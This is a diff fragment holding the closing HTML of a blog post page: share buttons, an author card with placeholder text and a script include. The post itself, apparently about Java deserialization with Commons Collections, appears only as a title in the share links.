+                href="#btn-open-shareoptions"
+                aria-label="Diesen Beitrag teilen"
+            >
+                <i class="fa fa-share-alt" aria-hidden="true"></i>
+            </a>
+        </li>
+        
+            
+            
+            <li class="post-action hide-xs">
+                <a
+                    class="post-action-btn btn btn--default"
+                    target="new" href="https://twitter.com/intent/tweet?text=https://self209.github.io/2021/12/29/20211229/"
+                    title="分享到 Twitter"
+                    aria-label="分享到 Twitter"
+                >
+                    <i class="fab fa-twitter" aria-hidden="true"></i>
+                </a>
+            </li>
+        
+            
+            
+            <li class="post-action hide-xs">
+                <a
+                    class="post-action-btn btn btn--default"
+                    target="new" href="https://plus.google.com/share?url=https://self209.github.io/2021/12/29/20211229/"
+                    title="分享到 Google+"
+                    aria-label="分享到 Google+"
+                >
+                    <i class="fab fa-google-plus" aria-hidden="true"></i>
+                </a>
+            </li>
+        
+            
+            
+            <li class="post-action hide-xs">
+                <a
+                    class="post-action-btn btn btn--default"
+                    target="new" href="http://connect.qq.com/widget/shareqq/index.html?url=https://self209.github.io/2021/12/29/20211229/&amp;title=java反序列化Commons Collections(二)"
+                    title="分享到 QQ"
+                    aria-label="分享到 QQ"
+                >
+                    <i class="fab fa-qq" aria-hidden="true"></i>
+                </a>
+            </li>
+        
+        
+        <li class="post-action">
+            
+                <a class="post-action-btn btn btn--default" href="#table-of-contents" aria-label="目录">
+            
+                <i class="fa fa-list" aria-hidden="true"></i>
+            </a>
+        </li>
+    </ul>
+</div>
+
+
+                </div>
+                
+    <div id="share-options-bar" class="share-options-bar" data-behavior="5">
+        <i id="btn-close-shareoptions" class="fa fa-times"></i>
+        <ul class="share-options">
+            
+                
+                
+                <li class="share-option">
+                    <a
+                        class="share-option-btn"
+                        target="new"
+                        href="https://twitter.com/intent/tweet?text=https://self209.github.io/2021/12/29/20211229/"
+                        aria-label="分享到 Twitter"
+                    >
+                        <i class="fab fa-twitter" aria-hidden="true"></i><span>分享到 Twitter</span>
+                    </a>
+                </li>
+            
+                
+                
+                <li class="share-option">
+                    <a
+                        class="share-option-btn"
+                        target="new"
+                        href="https://plus.google.com/share?url=https://self209.github.io/2021/12/29/20211229/"
+                        aria-label="分享到 Google+"
+                    >
+                        <i class="fab fa-google-plus" aria-hidden="true"></i><span>分享到 Google+</span>
+                    </a>
+                </li>
+            
+                
+                
+                <li class="share-option">
+                    <a
+                        class="share-option-btn"
+                        target="new"
+                        href="http://connect.qq.com/widget/shareqq/index.html?url=https://self209.github.io/2021/12/29/20211229/&amp;title=java反序列化Commons Collections(二)"
+                        aria-label="分享到 QQ"
+                    >
+                        <i class="fab fa-qq" aria-hidden="true"></i><span>分享到 QQ</span>
+                    </a>
+                </li>
+            
+        </ul>
+    </div>
+
+
+            
+        </div>
+        
+
+
+<div id="about">
+    <div id="about-card">
+        <div id="about-btn-close">
+            <i class="fa fa-times"></i>
+        </div>
+        
+            <h4 id="about-card-name">self_209</h4>
+        
+            <div id="about-card-bio"><p>author.bio</p>
+</div>
+        
+        
+            <div id="about-card-job">
+                <i class="fa fa-briefcase"></i>
+                <br/>
+                <p>author.job</p>
+
+            </div>
+        
+        
+    </div>
+</div>
+
+        
+        
+<div id="cover" style="background-image:url('/assets/images/cover.jpg');"></div>
+        <!--SCRIPTS-->
+
+<script src="/assets/js/script-xim376viwh5lr12gw0yeibdthi5jv6dbtso7hirh0xa2nvwxpntwvib0dgwh.min.js"></script>
+
+<!--SCRIPTS END-->
+
+
+
+
+
+    </body>
+</html>
